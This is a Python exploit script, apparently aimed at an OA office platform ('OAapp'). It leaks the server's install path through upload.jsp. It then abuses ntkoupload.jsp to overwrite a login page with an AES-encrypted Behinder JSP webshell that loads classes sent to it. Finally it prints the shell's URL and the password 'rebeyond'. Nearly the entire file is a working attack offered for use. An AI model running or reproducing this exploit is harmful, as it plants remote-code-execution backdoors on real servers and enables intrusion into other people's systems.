import requests,sys,re
import warnings
import random
def main():
    warnings.filterwarnings('ignore')  # 忽略SSL警告
    if len(sys.argv)<2:
        print("Usage: python3 yihua_exp.py url")
    else:
        url=sys.argv[1]
        path=get_path(url)
        wirtefile(url,path)
def get_path(url):
    if url[-1]=='/':
        urls = url + "OAapp/jsp/upload.jsp"
    else:
        urls = url + "/OAapp/jsp/upload.jsp"
    headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Referer': 'http://116.63.142.107:8081/OAapp/jsp/upload.jsp',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundary5Ur8laykKAWws2QO',
    'Content-Length': '285',
    }
    body='''
------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;name="file"; filename="xxx.xml"\r\nContent-Type: image/png\r\n\r\nreal path\r\n------WebKitFormBoundary5Ur8laykKAWws2QO\r\nContent-Disposition: form-data;name="filename"\r\n\r\nxxx.png\r\n------WebKitFormBoundary5Ur8laykKAWws2QO--\r\n'''
    r=requests.post(urls,body,headers=headers,verify=False)
    # print(r.text)
    try:
        path=re.findall('(.*?)Tomcat/webapps/.*?\.dat',r.text)[0]
    except:
        try:
            path=re.findall('(.*?)htoadata/appdata/.*?\.dat',r.text)[0]
        except:
            path=0
    return path
def wirtefile(urls,path):
    # try:
        # filename=''
        # zf='1234567890qwertyuiopasdfghjklzxcvbnm'
        # for _ in range(8):
        #     suiji1=random.randint(0,len(zf)-1)
        #     filename+=zf[suiji1]
        if urls[-1]=='/':
            url = urls + "OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"
        else:
            url = urls + "/OAapp/htpages/app/module/trace/component/fileEdit/ntkoupload.jsp"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Referer': 'http://116.63.142.107:8081/OAapp/jsp/upload.jsp',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'multipart/form-data;boundary=----WebKitFormBoundaryzRSYXfFlXqk6btQm',
            'Content-Length': '363',
    }
        body='''------WebKitFormBoundaryzRSYXfFlXqk6btQm\r
Content-Disposition: form-data;name="EDITFILE"; filename="xxx.txt"\r
Content-Type: image/png\r
\r
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>\r
------WebKitFormBoundaryzRSYXfFlXqk6btQm\r
Content-Disposition: form-data; name="newFileName"\r
\r
'''+path+'''Tomcat/webapps/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp\r
------WebKitFormBoundaryzRSYXfFlXqk6btQm'''
        requests.post(url,body,headers=headers,verify=False)
        # print(url)
        # print(body)
        # print(urls+'/'+filename+'.aspx')
        print('冰蝎马地址：'+urls+'/OAapp/htpages/app/module/login/normalLoginPageForOther.jsp,密码rebeyond')
        # print(r.text)
def logo():
    print('''
  _      _                                                             
 | |    | |                                                            \r
 | |__  | |_  _ __    __ _   __ _   ___  ___  ______  ___ __  __ _ __  \r
 | '_ \ | __|| '_ \  / _` | / _` | / _ \/ __||______|/ _ \\\\ \/ /| '_ \ \r
 | | | || |_ | |_) || (_| || (_| ||  __/\__ \       |  __/ >  < | |_) |\r
 |_| |_| \__|| .__/  \__,_| \__, | \___||___/        \___|/_/\_\| .__/ \r
             | |             __/ |                              | |    \r
             |_|            |___/                               |_|    \r
\r
                                        by Dsb v1.0
        ''')        
if __name__ == '__main__':
    logo()
    main()